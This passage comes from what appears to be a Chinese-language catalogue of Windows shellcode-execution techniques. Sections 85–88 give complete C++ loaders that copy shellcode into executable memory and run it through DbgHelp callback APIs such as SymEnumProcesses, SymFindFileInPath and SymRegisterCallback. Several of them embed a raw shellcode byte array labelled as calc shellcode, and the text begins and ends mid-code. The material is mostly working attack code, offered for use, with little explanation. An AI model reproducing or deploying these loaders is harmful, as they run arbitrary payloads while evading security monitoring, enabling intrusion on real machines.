hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;CONTEXT&nbsp;sContext&nbsp;=&nbsp;{&nbsp;<span class="hljs-number">0</span>&nbsp;};<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;StackWalk(<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IMAGE_FILE_MACHINE_AMD64,&nbsp;<span class="hljs-comment">//&nbsp;MachineType</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GetCurrentProcess(),&nbsp;<span class="hljs-comment">//&nbsp;hProcess</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-comment">//&nbsp;hThread</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;sStackFrame,&nbsp;<span class="hljs-comment">//&nbsp;A&nbsp;pointer&nbsp;to&nbsp;a&nbsp;STACKFRAME64&nbsp;structure.&nbsp;This&nbsp;structure&nbsp;receives&nbsp;information&nbsp;for&nbsp;the&nbsp;next&nbsp;frame</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;sContext,&nbsp;<span class="hljs-comment">//&nbsp;A&nbsp;pointer&nbsp;to&nbsp;a&nbsp;CONTEXT&nbsp;structure.</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-comment">//&nbsp;ReadMemoryRoutine</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(PFUNCTION_TABLE_ACCESS_ROUTINE)hAlloc,&nbsp;<span class="hljs-comment">//&nbsp;FunctionTableAccessRoutine</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-comment">//&nbsp;GetModuleBaseRoutine</span><br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-literal">NULL</span>);&nbsp;<span class="hljs-comment">//TranslateAddress</span><br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>CLEANUP:<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">52</span><br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">54</span>}<br><span class="linenum hljs-number">55</span><br><span class="linenum hljs-number">56</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">57</span></span>{<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">69</span><br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">71</span>}<br></code></pre>
<h1 id="h85symenumprocesses"><span>85.回调函数注入 通过 SymEnumProcesses</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;DbgHelp.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-comment">//&nbsp;Requires&nbsp;Dbghelp.lib&nbsp;</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">10</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;::SymInitialize(::GetCurrentProcess(),&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;FALSE);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(addr)<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;::SymEnumProcesses((PSYM_ENUMPROCESSES_CALLBACK)&nbsp;addr,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>}<br></code></pre>
<h1 id="h86symfindfileinpath"><span>86.回调函数注入 通过 SymFindFileInPath</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;requires&nbsp;Dbghelp.lib</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Dbghelp.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Dbghelp.lib"</span>)</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">10</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hProcess&nbsp;=&nbsp;::GetCurrentProcess();<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;::SymInitialize(hProcess,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;TRUE);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;SYMSRV_INDEX_INFO&nbsp;finfo;<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;::SymSrvGetFileIndexInfo(<span class="hljs-string">"c:\\windows\\system32\\kernel32.dll"</span>,&nbsp;&amp;finfo,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;dummy[MAX_PATH];<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;::SymFindFileInPath(hProcess,&nbsp;<span class="hljs-string">"c:\\windows\\system32"</span>,&nbsp;<span class="hljs-string">"kernel32.dll"</span>,&nbsp;&amp;finfo.timestamp,&nbsp;finfo.size,&nbsp;<span class="hljs-number">0</span>,&nbsp;SSRVOPT_DWORDPTR,&nbsp;dummy,&nbsp;(PFINDFILEINPATHCALLBACK)address,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">49</span><br><span class="linenum hljs-number">50</span>}<br></code></pre>
<h1 id="h87symregistercallback"><span>87.回调函数注入 通过 SymRegisterCallback</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"DbgHelp.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;dbghelp.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;SymRegisterCallback.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">23</span><br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Read&nbsp;shellcode&nbsp;and&nbsp;setup</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;SymInitialize(GetCurrentProcess(),&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;FALSE);<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;SymRegisterCallback(GetCurrentProcess(),&nbsp;(PSYMBOL_REGISTERED_CALLBACK)hAlloc,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;SymRefreshModuleList(GetCurrentProcess());<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>CLEANUP:<br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">43</span>}<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">46</span></span>{<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">58</span><br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">60</span>}<br></code></pre>
<h1 id="h88sysenumsourcefiles"><span>88.回调函数注入 通过 SysEnumSourceFiles</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;requires&nbsp;Dbghelp.lib</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Dbghelp.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Dbghelp.lib"</span>)</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">10</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">15</span><span 